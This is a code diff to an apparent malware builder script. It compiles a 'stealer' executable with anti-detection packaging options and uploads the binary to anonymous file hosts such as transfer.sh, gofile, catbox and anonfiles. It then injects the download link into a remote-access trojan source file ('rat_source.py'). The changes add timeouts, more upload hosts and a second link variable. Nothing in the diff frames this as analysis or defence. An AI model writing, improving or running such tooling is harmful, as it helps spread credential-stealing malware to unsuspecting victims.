@@ -896,14 +896,15 @@ def compile_stealer(output_name):
         
         stealer_output = f"{output_name}_stealer"
         
-        # PyInstaller command with anti-detection options (removed --key option)
+        # PyInstaller command with anti-detection options
         cmd = [
             "pyinstaller",
-            "--onefile",
+            "--onefile", 
             "--noconsole",
             "--clean",
             "--add-data", f"random_data_stealer.txt{os.pathsep}.",
             "--name", stealer_output,
+            "--timeout", "60",  # Add timeout to prevent hanging
             "stealer_source.py"
         ]
         
@@ -918,27 +919,35 @@ def compile_stealer(output_name):
                 "--remove-output",
                 "--assume-yes-for-downloads",
                 "--output-dir=dist",
+                "--timeout=60",  # Add timeout
                 "stealer_source.py"
             ]
             
-            process = subprocess.run(nuitka_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
+            process = subprocess.run(nuitka_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=300, check=False)
             
             if process.returncode == 0:
                 print(f"{Fore.GREEN}[+] Successfully compiled with Nuitka{Style.RESET_ALL}")
             else:
                 print(f"{Fore.YELLOW}[!] Nuitka compilation failed, falling back to PyInstaller{Style.RESET_ALL}")
-                process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
+                process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=300, check=False)
                 
                 if process.returncode != 0:
                     print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
                     return None
 
+        except subprocess.TimeoutExpired:
+            print(f"{Fore.RED}[!] Compilation timed out after 5 minutes{Style.RESET_ALL}")
+            return None
         except Exception:
             print(f"{Fore.YELLOW}[!] Nuitka not found, using PyInstaller{Style.RESET_ALL}")
-            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
-            
-            if process.returncode != 0:
-                print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
+            try:
+                process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=300, check=False)
+                
+                if process.returncode != 0:
+                    print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
+                    return None
+            except subprocess.TimeoutExpired:
+                print(f"{Fore.RED}[!] PyInstaller compilation timed out after 5 minutes{Style.RESET_ALL}")
                 return None
 
         # Check if the executable was created
@@ -959,7 +968,11 @@ def compile_stealer(output_name):
             hosts = [
                 'https://0x0.st',
                 'https://transfer.sh',
-                'https://file.io'
+                'https://file.io',
+                'https://gofile.io/uploadFile',
+                'https://catbox.moe/user/api.php',
+                'https://tmpfiles.org/api/v1/upload',
+                'https://api.anonfiles.com/upload'
             ]
             
             for host in hosts:
@@ -967,6 +980,16 @@ def compile_stealer(output_name):
                     with open(f"{stealer_output}.exe", 'rb') as f:
                         if host == 'https://transfer.sh':
                             response = requests.put(f'{host}/{stealer_output}.exe', data=f)
+                        elif host == 'https://catbox.moe/user/api.php':
+                            response = requests.post(host, files={'fileToUpload': f})
+                        elif host == 'https://gofile.io/uploadFile':
+                            response = requests.post(host, files={'file': f})
+                            if response.status_code == 200:
+                                data = response.json()
+                                if data.get('status') == 'ok':
+                                    url = f"https://gofile.io/d/{data['data']['code']}"
+                                    break
+                            continue
                         else:
                             response = requests.post(host, files={'file': f})
                             
@@ -1022,10 +1045,15 @@ def insert_stealer_link(link):
         
         # Try to find existing link variable
         link_pattern = re.compile(r'link\s*=\s*[\'"].*?[\'"]')
+        pkq_pattern = re.compile(r'pkq\s*=\s*[\'"].*?[\'"]')
         
         if link_pattern.search(content):
             # Replace existing link
             modified_content = link_pattern.sub(f"link = '{link}'", content)
+            if pkq_pattern.search(modified_content):
+                modified_content = pkq_pattern.sub(f"pkq = '{link}'", modified_content)
+            else:
+                modified_content = modified_content.replace(f"link = '{link}'", f"link = '{link}'\npkq = '{link}'")
             print(f"{Fore.GREEN}[+] Stealer link replaced in existing location!{Style.RESET_ALL}")
         else:
             # Look for a good place to insert the link
@@ -1043,17 +1071,19 @@ def insert_stealer_link(link):
             if good_positions:
                 insert_position = max(good_positions) + 1
                 lines.insert(insert_position, f"link = '{link}'")
+                lines.insert(insert_position + 1, f"pkq = '{link}'")
                 modified_content = '\n'.join(lines)
                 print(f"{Fore.GREEN}[+] Stealer link inserted at line {insert_position}!{Style.RESET_ALL}")
             else:
                 # Last resort, insert near the top
                 if len(lines) > 21:
                     lines.insert(21, f"link = '{link}'")
+                    lines.insert(22, f"pkq = '{link}'")
                     modified_content = '\n'.join(lines)
                     print(f"{Fore.GREEN}[+] Stealer link inserted at line 21!{Style.RESET_ALL}")
                 else:
                     # If file is too short, append to the end
-                    modified_content = content + f"\nlink = '{link}'\n"
+                    modified_content = content + f"\nlink = '{link}'\npkq = '{link}'\n"
                     print(f"{Fore.GREEN}[+] Stealer link appended to the end of the file!{Style.RESET_ALL}")
             
         return safe_write_file("rat_source.py", modified_content)
